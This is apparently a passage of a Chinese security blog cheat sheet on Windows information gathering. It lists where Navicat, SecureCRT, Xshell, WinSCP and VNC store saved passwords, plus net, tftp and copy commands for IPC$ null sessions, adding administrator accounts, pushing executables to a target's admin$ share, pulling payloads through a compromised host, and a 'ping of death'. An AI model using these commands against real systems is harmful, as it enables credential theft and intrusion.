<figure class="highlight taggerscript"><table><tbody><tr><td class="code"><pre><span class="line"><span class="variable">%windir%</span><span class="symbol">\s</span>ystem32<span class="symbol">\i</span>netsrv<span class="symbol">\a</span>ppcmd list site /config</span><br><span class="line"><span class="variable">%windir%</span><span class="symbol">\s</span>ystem32<span class="symbol">\i</span>netsrv<span class="symbol">\a</span>ppcmd list site /config /xml &gt; c:<span class="symbol">\s</span>ite s.xml</span><br></pre></td></tr></tbody></table></figure>

<p><strong>密码保存</strong></p>
<p>navicat<br>|数据库|路径|<br>|—-|—-|<br>|MySQL |            HKEYCURRENTUSER\Software\PremiumSoft \Navicat\Servers\ |<br>|MariaDB |HKEYCURRENTUSER\Software\PremiumSoft \NavicatMARIADB\Servers\ |<br>|MongoDB |HKEYCURRENTUSER\Software\PremiumSoft \NavicatMONGODB\Servers\ |<br>|Microsoft SQL |HKEYCURRENTUSER\Software\PremiumSoft \NavicatMSSQL\Servers|<br>|Oracle |HKEYCURRENTUSER\Software\PremiumSoft \NavicatOra\Servers\ |<br>|PostgreSQL |HKEYCURRENTUSER\Software\PremiumSoft \NavicatPG\Servers\ |<br>|SQLite |HKEYCURRENTUSER\Software\PremiumSoft \NavicatSQLite\Servers|</p>
<p>SecureCRT</p>
<table>
<thead>
<tr>
<th>系统版本</th>
<th>路径</th>
</tr>
</thead>
<tbody><tr>
<td>xp/win2003</td>
<td>C:\Documents and Settings\USERNAME\Application Data\VanDyke\Config\Sessions</td>
</tr>
<tr>
<td>win7/win2008以上</td>
<td>C:\Users\USERNAME\AppData\Roaming\Va nDyke\Config\Sessions</td>
</tr>
</tbody></table>
<p>Xshell<br>|版本 |路径 |<br>|—-|—-|<br>|Xshell 5| %userprofile%\Documents\NetSarang\Xshell\Sessions|<br>|Xshell 6 |%userprofile%\Documents\NetSarang Computer\6\Xshell\Sessions|</p>
<p>WinSCP</p>
<figure class="highlight taggerscript"><table><tbody><tr><td class="code"><pre><span class="line">HKCU<span class="symbol">\S</span>oftware<span class="symbol">\M</span>artin Prikryl<span class="symbol">\W</span>inSCP 2<span class="symbol">\S</span>essions</span><br></pre></td></tr></tbody></table></figure>

<p>VNC</p>
<table>
<thead>
<tr>
<th>版本</th>
<th>路径</th>
<th>类型</th>
</tr>
</thead>
<tbody><tr>
<td>RealVNC</td>
<td>HKEYLOCALMACHINE\SOFT WARE\RealVNC\vncserver</td>
<td>Password</td>
</tr>
<tr>
<td>TightVNC</td>
<td>HKEYCURRENTUSER\Softwa re\TightVNC\Server Value</td>
<td>Password or PasswordViewOnly</td>
</tr>
<tr>
<td>TigerVNC</td>
<td>HKEYLOCALUSER\Software\ TigerVNC\WinVNC4</td>
<td>Password</td>
</tr>
<tr>
<td>UltraVNC</td>
<td>C:\Program Files\UltraVNC\ultravnc.ini</td>
<td>passwd or passwd2</td>
</tr>
</tbody></table>
<h2 id="DOS命令"><a href="#DOS命令" class="headerlink" title="DOS命令"></a>DOS命令</h2><figure class="highlight dos"><table><tbody><tr><td class="code"><pre><span class="line"><span class="number">1</span>.gpedit.msc—–组策略</span><br><span class="line"><span class="number">2</span>.sndrec32——-录音机</span><br><span class="line"><span class="number">3</span>.Nslookup——-IP地址侦测器，是一个监测网络中DNS服务器是否能正确实现域名解析的命令行工具。它在WindowsNT/<span class="number">2000</span>/XP中均可使用,但在Windows98中却没有集成这一个工具。</span><br><span class="line"><span class="number">4</span>.explorer——-打开资源管理器</span><br><span class="line"><span class="number">5</span>.logoff———注销命令</span><br><span class="line"><span class="number">6</span>.shutdown——-<span class="number">60</span>秒倒计时关机命令</span><br><span class="line"><span class="number">7</span>.lusrmgr.msc—-本机用户和组</span><br><span class="line"><span class="number">8</span>.services.msc—本地服务设置</span><br><span class="line"><span class="number">9</span>.oobe/msoobe /a—-检查XP是否激活</span><br><span class="line"><span class="number">10</span>.notepad——–打开记事本</span><br><span class="line"><span class="number">11</span>.cleanmgr——-垃圾整理</span><br><span class="line"><span class="number">12</span>.netstartmessenger—-开始信使服务</span><br><span class="line"><span class="number">13</span>.compmgmt.msc—计算机管理</span><br><span class="line"><span class="number">14</span>.netstopmessenger—–停止信使服务</span><br><span class="line"><span class="number">15</span>.conf———–启动netmeeting</span><br><span class="line"><span class="number">16</span>.dvdplay——–DVD播放器</span><br><span class="line"><span class="number">17</span>.charmap——–启动字符映射表</span><br><span class="line"><span class="number">18</span>.diskmgmt.msc—磁盘管理实用程序</span><br><span class="line"><span class="number">19</span>.calc———–启动计算器</span><br><span class="line"><span class="number">20</span>.dfrg.msc——-磁盘碎片整理程序</span><br><span class="line"><span class="number">21</span>.<span class="built_in">chkdsk</span>.exe—–<span class="built_in">Chkdsk</span>磁盘检查</span><br><span class="line"><span class="number">22</span>.devmgmt.msc—设备管理器</span><br><span class="line"><span class="number">23</span>.regsvr32 /u *.dll—-停止dll文件运行</span><br><span class="line"><span class="number">24</span>.drwtsn32——系统医生</span><br><span class="line"><span class="number">25</span>.rononce-p—-<span class="number">15</span>秒关机</span><br><span class="line"><span class="number">26</span>.dxdiag———检查DirectX信息</span><br><span class="line"><span class="number">27</span>.regedt32——-注册表编辑器</span><br><span class="line"><span class="number">28</span>.Msconfig.exe—系统配置实用程序</span><br><span class="line"><span class="number">29</span>.rsop.msc——-组策略结果集</span><br><span class="line"><span class="number">30</span>.mem.exe——–显示内存使用情况</span><br><span class="line"><span class="number">31</span>.regedit.exe—-注册表</span><br><span class="line"><span class="number">32</span>.winchat——–XP自带局域网聊天</span><br><span class="line"><span class="number">33</span>.progman——–程序管理器</span><br><span class="line"><span class="number">34</span>.winmsd———系统信息</span><br><span class="line"><span class="number">35</span>.perfmon.msc—-计算机性能监测程序</span><br><span class="line"><span class="number">36</span>.winver———检查Windows版本</span><br><span class="line"><span class="number">37</span>.sfc/scannow—–扫描错误并复原</span><br><span class="line"><span class="number">38</span>.taskmgr—–任务管理器（<span class="number">2000</span>/xp/<span class="number">2003</span></span><br><span class="line"><span class="number">39</span>.winver———检查Windows版本</span><br><span class="line"><span class="number">40</span>.wmimgmt.msc—-打开windows管理体系结构(WMI)</span><br><span class="line"><span class="number">41</span>.wupdmgr——–windows更新程序</span><br><span class="line"><span class="number">42</span>.wscript——–windows脚本宿主设置</span><br><span class="line"><span class="number">43</span>.write———-写字板</span><br><span class="line"><span class="number">44</span>.winmsd———系统信息</span><br><span class="line"><span class="number">45</span>.wiaacmgr——-扫描仪和照相机向导</span><br><span class="line"><span class="number">46</span>.winchat——–XP自带局域网聊天</span><br><span class="line"><span class="number">47</span>.mem.exe——–显示内存使用情况</span><br><span class="line"><span class="number">48</span>.Msconfig.exe—系统配置实用程序</span><br><span class="line"><span class="number">49</span>.mplayer2——-简易widnowsmediaplayer</span><br><span class="line"><span class="number">50</span>.mspaint——–画图板</span><br><span class="line"><span class="number">51</span>.mstsc———-远程桌面连接</span><br><span class="line"><span class="number">52</span>.mplayer2——-媒体播放机</span><br><span class="line"><span class="number">53</span>.magnify——–放大镜实用程序</span><br><span class="line"><span class="number">54</span>.mmc————打开控制台</span><br><span class="line"><span class="number">55</span>.mobsync——–同步命令</span><br><span class="line"><span class="number">56</span>.dxdiag———检查DirectX信息</span><br><span class="line"><span class="number">57</span>.iexpress——-木马捆绑工具，系统自带</span><br><span class="line"><span class="number">58</span>.fsmgmt.msc—–共享文件夹管理器</span><br><span class="line"><span class="number">59</span>.utilman——–辅助工具管理器</span><br><span class="line"><span class="number">60</span>.diskmgmt.msc—磁盘管理实用程序</span><br><span class="line"><span class="number">61</span>.dcomcnfg——-打开系统组件服务</span><br><span class="line"><span class="number">62</span>.ddeshare——-打开DDE共享设置</span><br><span class="line"><span class="number">63</span>.osk————打开屏幕键盘</span><br><span class="line"><span class="number">64</span>.odbcad32——-ODBC数据源管理器</span><br><span class="line"><span class="number">65</span>.oobe/msoobe /a—-检查XP是否激活</span><br><span class="line"><span class="number">66</span>.notepad——–打开记事本</span><br><span class="line"><span class="number">67</span>.nslookup——-网络管理的工具向导</span><br><span class="line"><span class="number">68</span>.ntbackup——-系统备份和还原</span><br><span class="line"><span class="number">69</span>.narrator——-屏幕“讲述人”</span><br><span class="line"><span class="number">70</span>.ntmsmgr.msc—-移动存储管理器</span><br><span class="line"><span class="number">71</span>.ntmsoprq.msc—移动存储管理员操作请求</span><br><span class="line"><span class="number">72</span>.netstat -an—-(TC)命令检查接口</span><br><span class="line"><span class="number">73</span>.syncapp——–创建一个公文包</span><br><span class="line"><span class="number">74</span>.sysedit——–系统配置编辑器</span><br><span class="line"><span class="number">75</span>.sigverif——-文件签名验证程序</span><br><span class="line"><span class="number">76</span>.ciadv.msc——索引服务程序</span><br><span class="line"><span class="number">77</span>.shrpubw——–创建共享文件夹</span><br><span class="line"><span class="number">78</span>.secpol.msc—–本地安全策略</span><br><span class="line"><span class="number">79</span>.syskey———系统加密，一旦加密就不能解开，保护windowsxp系统的双重密码</span><br><span class="line"><span class="number">80</span>.services.msc—本地服务设置</span><br><span class="line"><span class="number">81</span>.Sndvol32——-音量控制程序</span><br><span class="line"><span class="number">82</span>.sfc.exe——–系统文件检查器</span><br><span class="line"><span class="number">83</span>.sfc/scannow—windows文件保护</span><br><span class="line"><span class="number">84</span>.ciadv.msc——索引服务程序</span><br><span class="line"><span class="number">85</span>.tourstart——xp简介（安装完成后出现的漫游xp程序）</span><br><span class="line"><span class="number">86</span>.taskmgr——–任务管理器</span><br><span class="line"><span class="number">87</span>.eventvwr——-事件查看器</span><br><span class="line"><span class="number">88</span>.eudcedit——-造字程序</span><br><span class="line"><span class="number">89</span>.compmgmt.msc—计算机管理</span><br><span class="line"><span class="number">90</span>.packager——-对象包装程序</span><br><span class="line"><span class="number">91</span>.perfmon.msc—-计算机性能监测程序</span><br><span class="line"><span class="number">92</span>.charmap——–启动字符映射表</span><br><span class="line"><span class="number">93</span>.cliconfg——-SQLSERVER客户端网络实用程序</span><br><span class="line"><span class="number">94</span>.Clipbrd——–剪贴板查看器</span><br><span class="line"><span class="number">95</span>.conf———–启动netmeeting</span><br><span class="line"><span class="number">96</span>.certmgr.msc—-证书管理实用程序</span><br><span class="line"><span class="number">97</span>.regsvr32 /u *.dll—-停止dll文件运行</span><br><span class="line"><span class="number">98</span>.regsvr32 /u zip fldr.dll——取消ZIP支持</span><br><span class="line"><span class="number">99</span>.<span class="built_in">cmd</span>.exe——–<span class="built_in">CMD</span>命令提示符</span><br><span class="line"><span class="number">100</span>.<span class="built_in">chkdsk</span>.exe—–<span class="built_in">Chkdsk</span>磁盘检查</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">　　<span class="built_in">net</span> use \\ip\ipc$ "" /user:""  建立IPC空链接</span><br><span class="line">　　<span class="built_in">net</span> use ip ipc$ "密码" /user:"用户名"  建立IPC非空链接</span><br><span class="line">　　<span class="built_in">net</span> use h:ipc$"密码"/user:"  用户名"直接登陆后映射对方C：到本地为H:</span><br><span class="line">　　<span class="built_in">net</span> use h:ipc$  登陆后映射对方C：到本地为H:</span><br><span class="line">　　<span class="built_in">net</span> use ip ipc$/<span class="built_in">del</span>  删除IPC链接</span><br><span class="line">　　<span class="built_in">net</span> use h:/<span class="built_in">del</span>  删除映射对方到本地的为H:的映射</span><br><span class="line">　　<span class="built_in">net</span> user 用户名　密码　/add  建立用户</span><br><span class="line">　　<span class="built_in">net</span> user guest /active:yes  激活guest用户</span><br><span class="line">　　<span class="built_in">net</span> user  查看有哪些用户</span><br><span class="line">　　<span class="built_in">net</span> user 帐户  名查看帐户的属性</span><br><span class="line">　　<span class="built_in">net</span> localgroup administrators 用户名 /add    把“用户”添加到管理员中使其具有管理员权限</span><br><span class="line">　　netstart  查看开启了哪些服务</span><br><span class="line">　　netstart 服务名　  开启服务；(如:netstarttelnet，netstartschedule)</span><br><span class="line">　　<span class="built_in">net</span> stop 服务名  停止某服务</span><br><span class="line">　　<span class="built_in">net</span> <span class="built_in">time</span> 目标ip  查看对方时间</span><br><span class="line">　　<span class="built_in">net</span> <span class="built_in">time</span> 目标ip/<span class="built_in">set</span>  设置本地计算机时间与“目标IP”主机的时间同步,加上参数/yes可取消确认信息</span><br><span class="line">　　<span class="built_in">net</span> view  查看本地局域网内开启了哪些共享</span><br><span class="line">　　<span class="built_in">net</span> view ip  查看对方局域网内开启了哪些共享</span><br><span class="line">　　<span class="built_in">net</span> config  显示系统网络设置</span><br><span class="line">　　<span class="built_in">net</span> logoff  断开连接的共享</span><br><span class="line">　　<span class="built_in">net</span> <span class="built_in">pause</span>  服务名暂停某服务</span><br><span class="line">　　<span class="built_in">net</span> send ip "文本信息"  向对方发信息</span><br><span class="line">　　<span class="built_in">net</span> <span class="built_in">ver</span>  局域网内正在使用的网络连接类型和信息</span><br><span class="line">　　<span class="built_in">net</span> share  查看本地开启的共享</span><br><span class="line">　　<span class="built_in">net</span> share ipc$  开启ipc$共享</span><br><span class="line">　　<span class="built_in">net</span> share ipc$ /<span class="built_in">del</span>  删除ipc$共享</span><br><span class="line">　　<span class="built_in">net</span> share c$ /<span class="built_in">del</span>  删除C：共享</span><br><span class="line">　　<span class="built_in">net</span> user guest <span class="number">12345</span>  用guest用户登陆后用将密码改为<span class="number">12345</span></span><br><span class="line">　　<span class="built_in">net</span> password 密码  更改系统登陆密码</span><br><span class="line">　　netstat -a  查看开启了哪些端口,常用netstat -an</span><br><span class="line">　　netstat -n  查看端口的网络连接情况，常用netstat -an</span><br><span class="line">　　netstat -v  查看正在进行的工作</span><br><span class="line">　　netstat -p 协议名   例：netstat -p tcp ip  查看某协议使用情况</span><br><span class="line">　　netstat -s 查看正在使用的所有协议使用情况</span><br><span class="line">　　nbtstat -A ip  对方<span class="number">136</span>到<span class="number">139</span>其中一个端口开了的话，就可查看对方最近登陆的用户名</span><br><span class="line">　　tracert -参数 ip(或计算机名)  跟踪路由（数据包），参数：“-w数字”用于设置超时间隔。</span><br><span class="line">　　<span class="built_in">ping</span> ip(或域名)  向对方主机发送默认大小为<span class="number">32</span>字节的数据，参数：“-l[空格]数据包大小”；“-n发送数据次数”；“-t”指一直<span class="built_in">ping</span>。</span><br><span class="line">　　<span class="built_in">ping</span> -t -l <span class="number">65550</span> ip  死亡之<span class="built_in">ping</span>(发送大于<span class="number">64</span>K的文件并一直<span class="built_in">ping</span>就成了死亡之<span class="built_in">ping</span>)</span><br><span class="line">　　<span class="built_in">ipconfig</span>(winipcfg)  用于windowsNT及XP(windows9598)查看本地ip地址，<span class="built_in">ipconfig</span>可用参数“/all”显示全部配置信息</span><br><span class="line">　　tlist -t  以树行列表显示进程(为系统的附加工具，默认是没有安装的，在安装目录的Support/tools文件夹内)</span><br><span class="line">　　kill -F 进程名  加-F参数后强制结束某进程(为系统的附加工具，默认是没有安装的，在安装目录的Support/tools文件夹内)</span><br><span class="line">　　<span class="built_in">del</span> -F 文件名  加-F参数后就可删除只读文件,/AR、/AH、/AS、/AA分别表示删除只读、隐藏、系统、存档文件，/A-R、/A-H、/A-S、/A-A表示删除除只读、隐藏、系统、存档以外的文件。例如“<span class="built_in">DEL</span>/AR*.*”表示删除当前目录下所有只读文件，“<span class="built_in">DEL</span>/A-S*.*”表示删除当前目录下除系统文件以外的所有文件</span><br><span class="line">　　<span class="built_in">del</span> /S /Q 目录 或用：<span class="built_in">rmdir</span>/s/Q目录/S删除目录及目录下的所有子目录和文件。同时使用参数/Q可取消删除操作时的系统确认就直接删除。（二个命令作用相同）</span><br><span class="line">　　<span class="built_in">move</span> 盘符路径 要移动的文件名　 存放移动文件的路径移动后文件名移动文件,用参数/y将取消确认移动目录存在相同文件的提示就直接覆盖</span><br><span class="line">　　fc one.txt two.txt&gt;<span class="number">3</span>st.txt对比二个文件并把不同之处输出到<span class="number">3</span>st.txt文件中，"&gt;"和"&gt;&gt;"是重定向命令</span><br><span class="line">　　<span class="built_in">at</span> id号   开启已注册的某个计划任务</span><br><span class="line">　　<span class="built_in">at</span> /delete  停止所有计划任务，用参数/yes则不需要确认就直接停止</span><br><span class="line">　　<span class="built_in">at</span> id号 /delete   停止某个已注册的计划任务</span><br><span class="line">　　<span class="built_in">at</span>  查看所有的计划任务</span><br><span class="line">　　<span class="built_in">at</span> ip <span class="built_in">time</span> 程序名(或一个命令)/r    在某时间运行对方某程序并重新启动计算机</span><br><span class="line">　　finger username@host  查看最近有哪些用户登陆</span><br><span class="line">　　telnet ip端口  远程登陆服务器,默认端口为<span class="number">23</span></span><br><span class="line">　　open ip  连接到IP（属telnet登陆后的命令）</span><br><span class="line">　　telnet  在本机上直接键入telnet将进入本机的telnet</span><br><span class="line">　　<span class="built_in">copy</span>  路径文件名<span class="number">1</span>　路径文件名<span class="number">2</span>/y复制文件<span class="number">1</span>到指定的目录为文件<span class="number">2</span>，用参数/y就同时取消确认你要改写一份现存目录文件</span><br><span class="line">　　<span class="built_in">copy</span> c:srv.exe ip admin$  复制本地c:srv.exe到对方的admin下</span><br><span class="line">　　<span class="built_in">copy</span> <span class="number">1</span>st.jpg/b + <span class="number">2</span>st.txt /a <span class="number">3</span>st.jpg   将<span class="number">2</span>st.txt的内容藏身到<span class="number">1</span>st.jpg中生成<span class="number">3</span>st.jpg新的文件，注：<span class="number">2</span>st.txt文件头要空三排，参数：/b指二进制文件，/a指ASCLL格式文件</span><br><span class="line">　　<span class="built_in">copy</span> ip admin$svv.exe c:或: <span class="built_in">copy</span> ip admin$* .*  复制对方admini$共享下的srv.exe文件（所有文件）至本地C：</span><br><span class="line">　　<span class="built_in">xcopy</span> 要复制的文件或目录树 目标地址目录名   复制文件和目录树，用参数/Y将不提示覆盖相同文件</span><br><span class="line">　　用参数/e才可连目录下的子目录一起复制到目标地址下。</span><br><span class="line">　　tftp -i 自己IP(用肉机作跳板时这用肉机IP)  getserver.exec:server.exe登陆后，将“IP”的server.exe下载到目标主机c:server.exe参数：-i指以二进制模式传送，如传送exe文件时用，如不加-i则以ASCII模式（传送文本文件模式）进行传送</span><br><span class="line">　　tftp -i 对方IP　putc:server.exe登陆后，上传本地c:server.exe至主机</span><br><span class="line">　　ftp ip端口  用于上传文件至服务器或进行文件操作，默认端口为<span class="number">21</span>。bin指用二进制方式传送（可执行文件进）；默认为ASCII格式传送(文本文件时)</span><br><span class="line">　　route <span class="built_in">print</span>  显示出IP路由，将主要显示网络地址Networkaddres，子网掩码Netmask，网关地址Gatewayaddres，接口地址Interface</span><br><span class="line">　　arp  查看和处理ARP缓存，ARP是名字解析的意思，负责把一个IP解析成一个物理性的MAC地址。arp-a将显示出全部信息</span><br><span class="line">　　<span class="built_in">start</span> 程序名或命令 /max或/min  新开一个新窗口并最大化（最小化）运行某程序或命令</span><br><span class="line">　　mem  查看cpu使用情况</span><br><span class="line">　　<span class="built_in">attrib</span> 文件名(目录名)  查看某文件（目录）的属性</span><br><span class="line">　　<span class="built_in">attrib</span> 文件名-A-R-S-H或+A+R+S+H   去掉(添加)某文件的存档，只读，系统，隐藏属性；用+则是添加为某属性</span><br><span class="line">　　<span class="built_in">dir</span>  查看文件，参数：/Q显示文件及目录属系统哪个用户，/T:C显示文件创建时间，/T:A显示文件上次被访问时间，/T:W上次被修改时间</span><br><span class="line">　　<span class="built_in">date</span> /t、<span class="built_in">time</span> /t使用此参数即“<span class="built_in">DATE</span> /T”、“<span class="built_in">TIME</span> /T”将只显示当前日期和时间，而不必输入新日期和时间</span><br><span class="line">　　<span class="built_in">set</span> 指定环境变量名称=要指派给变量的字符  设置环境变量</span><br><span class="line">　　<span class="built_in">set</span>  显示当前所有的环境变量</span><br><span class="line">　　setp  (或其它字符)显示出当前以字符p(或其它字符)开头的所有环境变量</span><br><span class="line">　　<span class="built_in">pause</span>  暂停批处理程序，并显示出：请按任意键继续....</span><br><span class="line">　　<span class="keyword">if</span>  在批处理程序中执行条件处理（更多说明见<span class="keyword">if</span>命令及变量）</span><br><span class="line">　　<span class="keyword">goto</span>  标签将<span class="built_in">cmd</span>.exe导向到批处理程序中带标签的行（标签必须单独一行，且以冒号打头，例如：“：<span class="built_in">start</span>”标签）</span><br><span class="line">　　<span class="keyword">call</span>  路径批处理文件名从批处理程序中调用另一个批处理程序（更多说明见<span class="keyword">call</span>/?）</span><br><span class="line">　　<span class="keyword">for</span>  对一组文件中的每一个文件执行某个特定命令（更多说明见<span class="keyword">for</span>命令及变量）</span><br><span class="line">　　<span class="built_in">echo</span> on或off  打开或关闭<span class="built_in">echo</span>，仅用<span class="built_in">echo</span>不加参数则显示当前<span class="built_in">echo</span>设置</span><br><span class="line">　　<span class="built_in">echo</span>  信息在屏幕上显示出信息</span><br><span class="line">　　<span class="built_in">echo</span> 信息&gt;&gt;pass.txt  将"信息"保存到pass.txt文件中</span><br><span class="line">　　<span class="built_in">findstr</span>  "Hello"aa.txt在aa.txt文件中寻找字符串hello</span><br><span class="line">　　<span class="built_in">find</span>  文件名查找某文件</span><br><span class="line">　　<span class="built_in">title</span>  标题名字更改<span class="built_in">CMD</span>窗口标题名字</span><br><span class="line">　　<span class="built_in">color</span>  颜色值设置<span class="built_in">cmd</span>控制台前景和背景颜色；<span class="number">0</span>=黑、<span class="number">1</span>=蓝、<span class="number">2</span>=绿、<span class="number">3</span>=浅绿、<span class="number">4</span>=红、<span class="number">5</span>=紫、<span class="number">6</span>=黄、<span class="number">7</span>=白、<span class="number">8</span>=灰、<span class="number">9</span>=淡蓝、A=淡绿、B=淡浅绿、C=淡红、D=淡紫、E=淡黄、F=亮白</span><br><span class="line">　　prompt  名称更改<span class="built_in">cmd</span>.exe的显示的命令提示符(把C:、D:统一改为：EntSky)</span><br><span class="line">　　<span class="built_in">ver</span>  在DOS窗口下显示版本信息</span><br><span class="line">　　winver  弹出一个窗口显示版本信息（内存大小、系统版本、补丁版本、计算机名）</span><br><span class="line">　　<span class="built_in">format</span> 盘符 /<span class="built_in">FS</span>:类型  格式化磁盘,类型:FAT、FAT32、NTFS,例：<span class="built_in">Format</span> D: /<span class="built_in">FS</span>:NTFS</span><br><span class="line">　　<span class="built_in">md</span>　目录名    创建目录</span><br><span class="line">　　<span class="built_in">replace</span> 源文件　  要替换文件的目录替换文件</span><br><span class="line">　　<span class="built_in">ren</span> 原文件名　 新文件名重命名文件名</span><br><span class="line">　　<span class="built_in">tree</span>  以树形结构显示出目录，用参数-f将列出第个文件夹中文件名称</span><br><span class="line">　　<span class="built_in">type</span>  文件名显示文本文件的内容</span><br><span class="line">　　<span class="built_in">more</span>  文件名逐屏显示输出文件</span><br><span class="line">　　<span class="built_in">doskey</span> 要锁定的命令=字符</span><br><span class="line">　　<span class="built_in">doskey</span> 要解锁命令=  为DOS提供的锁定命令(编辑命令行，重新调用win2k命令，并创建宏)。如：锁定<span class="built_in">dir</span>命令：doskeydir=entsky(不能用doskeydir=<span class="built_in">dir</span>)；解锁：doskeydir=</span><br><span class="line">　　taskmgr  调出任务管理器</span><br><span class="line">　　<span class="built_in">chkdsk</span> /F D:  检查磁盘D并显示状态报告；加参数/f并修复磁盘上的错误</span><br><span class="line">　　tlntadmntelnt服务admn,键入tlntadmn选择<span class="number">3</span>，再选择<span class="number">8</span>,就可以更改telnet服务默认端口<span class="number">23</span>为其它任何端口</span><br><span class="line">　　<span class="keyword">exit</span>  退出<span class="built_in">cmd</span>.exe程序或目前，用参数/B则是退出当前批处理脚本而不是<span class="built_in">cmd</span>.exe</span><br><span class="line">　　<span class="built_in">path</span>  路径可执行文件的文件名为可执行文件设置一个路径。</span><br><span class="line">　　<span class="built_in">cmd</span>  启动一个win2K命令解释窗口。参数：/eff、/en关闭、开启命令扩展；更我详细说明见<span class="built_in">cmd</span> /?</span><br><span class="line">　　regedit /s 注册表文件名   导入注册表；参数/S指安静模式导入，无任何提示；</span><br><span class="line">　　regedit /e 注册表文件名   导出注册表</span><br><span class="line">  </span><br><span class="line">　　<span class="built_in">cacls</span> 文件名　</span><br><span class="line">  参数显示或修改文件访问控制列表（ACL）——针对NTFS格式时。参数：/D用户名:设定拒绝某用户访问；/P用户名:perm替换指定用户的访问权限；/G用户名:perm赋予指定用户访问权限；Perm可以是:N无，R读取，W写入，C更改(写入)，F完全控制；例：caclsD:est.txt/Dpub设定d:est.txt拒绝pub用户访问。</span><br><span class="line">  </span><br><span class="line">　　<span class="built_in">cacls</span> 文件名  查看文件的访问用户权限列表</span><br><span class="line"><span class="comment">　　REM 文本内容  在批处理文件中添加注解</span></span><br><span class="line">　　netsh  查看或更改本地网络配置情况</span><br></pre></td></tr></tbody></table></figure>



<p>参考：</p>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/1-Ry/p/15156357.html">https://www.cnblogs.com/1-Ry/p/15156357.html</a></p>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/hookjoy/p/10899119.html">https://www.cnblogs.com/hookjoy/p/10899119.html</a></p>
<p>GFinger的windows信息收集</p>
<p>部分资料网络google与百度，参考资料作者来源不详</p>

                
            </div>
            <hr/>

            

    <div class="reprint" id="reprint-statement">
        
            <div class="reprint__author">
                <span class="reprint-meta" style="font-weight: bold;">
                    <i class="fas fa-user">
                        文章作者:
                    </i>
                </span>
                <span class="reprint-info">
                    <a href="/about" rel="external nofollow noreferrer">leaves</a>
                </span>
            </div>
            <div class="reprint__type">
                <span class="reprint-meta" style="font-weight: bold;">
                    <i class="fas fa-link">
                        文章链接:
                    </i>
                </span>
                <span class="reprint-info">
                    <a href="http://greenleavesl.github.io/2021/12/23/windows%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/">http://greenleavesl.github.io/2021/12/23/windows%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/</a>
                </span>
            </div>
            <div class="reprint__notice">
                <span class="reprint-meta" style="font-weight: bold;">
                    <i class="fas fa-copyright">
                        版权声明:
                    </i>
                </span>
                <span class="reprint-info">
                    本博客所有文章除特別声明外，均采用
                    <a href="https://creativecommons.org/licenses/by/4.0/deed.zh" rel="external nofollow noreferrer" target="_blank">CC BY 4.0</a>
                    许可协议。转载请注明来源
                    <a href="/about" target="_blank">leaves</a>
                    !
                </span>
            </div>
        
    </div>

    <script async defer>
      document.addEventListener("copy", function (e) {
        let toastHTML = '<span>复制成功，请遵循本文的转载规则</span><button class="btn-flat toast-action" onclick="navToReprintStatement()" style="font-size: smaller">查看</a>';
        M.toast({html: toastHTML})
      });

      function navToReprintStatement() {
        $("html, body").animate({scrollTop: $("#reprint-statement").offset().top - 80}, 800);
      }
    </script>



            <div class="tag_share" style="display: block;">
                <div class="post-meta__tag-list" style="display: inline-block;">
                    
                        <div class="article-tag">
                            
                                <a href="/tags/windows/">
                                    <span class="chip bg-color">windows</span>
                                </a>
                            
                                <a href="/tags/%E5%91%BD%E4%BB%A4/">
                                    <span class="chip bg-color">命令</span>
                                </a>
                            
                                <a href="/tags/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/">
                                    <span class="chip bg-color">信息收集</span>
                                </a>
                            
                        </div>
                    
                </div>
                <div class="post_share" style="zoom: 80%; width: fit-content; display: inline-block; float: right; margin: -0.15rem 0;">
                    <link rel="stylesheet" type="text/css" href="/libs/share/css/share.min.css">
<div id="article-share">

    
    <div class="social-share" data-sites="twitter,facebook,google,qq,qzone,wechat,weibo,douban,linkedin" data-wechat-qrcode-helper="<p>微信扫一扫即可分享！</p>"></div>
    <script src="/libs/share/js/social-share.min.js"></script>
    

    

</div>

                </div>
            </div>
            
                <style>
    #reward {
        margin: 40px 0;
        text-align: center;
    }

    #reward .reward-link {
        font-size: 1.4rem;
        line-height: 38px;
    }

    #reward .btn-floating:hover {
        box-shadow: 0 6px 12px rgba(0, 0, 0, 0.2), 0 5px 15px rgba(0, 0, 0, 0.2);
    }

    #rewardModal {
        width: 320px;
        height: 350px;
    }

    #rewardModal .reward-title {
        margin: 15px auto;
        padding-bottom: 5px;
    }

    #rewardModal .modal-content {
        padding: 10px;
    }

    #rewardModal .close {
        position: absolute;
        right: 15px;
        top: 15px;
        color: rgba(0, 0, 0, 0.5);
        font-size: 1.3rem;
        line-height: 20px;
        cursor: pointer;
    }

    #rewardModal .close:hover {
        color: #ef5350;
        transform: scale(1.3);
        -moz-transform:scale(1.3);
        -webkit-transform:scale(1.3);
        -o-transform:scale(1.3);
    }

    #rewardModal .reward-tabs {
        margin: 0 auto;
        width: 210px;
    }

    .reward-tabs .tabs {
        height: 38px;
        margin: 10px auto;
        padding-left: 0;
    }

    .reward-content ul {
        padding-left: 0 !important;
    }

    .reward-tabs .tabs .tab {
        height: 38px;
        line-height: 38px;
    }

    .reward-tabs .tab a {
        color: #fff;
        background-color: #ccc;
    }

    .reward-tabs .tab a:hover {
        background-color: #ccc;
        color: #fff;
    }

    .reward-tabs .wechat-tab .active {
        color: #fff !important;
        background-color: #22AB38 !important;
    }

    .reward-tabs .alipay-tab .active {
        color: #fff !important;
        background-color: #019FE8 !important;
    }

    .reward-tabs .reward-img {
        width: 210px;
        height: 210px;
    }
</style>

<div id="reward">
    <a href="#rewardModal" class="reward-link modal-trigger btn-floating btn-medium waves-effect waves-light red">赏</a>

    <!-- Modal Structure -->
    <div id="rewardModal" class="modal">
        <div class="modal-content">
            <a class="close modal-close"><i class="fas fa-times"></i></a>
            <h4 class="reward-title">你的赏识是我前进的动力</h4>
            <div class="reward-content">
                <div class="reward-tabs">
                    <ul class="tabs row">
                        <li class="tab col s6 alipay-tab waves-effect waves-light"><a href="#alipay">支付宝</a></li>
                        <li class="tab col s6 wechat-tab waves-effect waves-light"><a href="#wechat">微 信</a></li>
                    </ul>
                    <div id="alipay">
                        <img src="/medias/reward/alipay.jpg" class="reward-img" alt="支付宝打赏二维码">
                    </div>
                    <div id="wechat">
                        <img src="/medias/reward/wechat.png" class="reward-img" alt="微信打赏二维码">
                    </div>
                </div>
            </div>
        </div>
    </div>
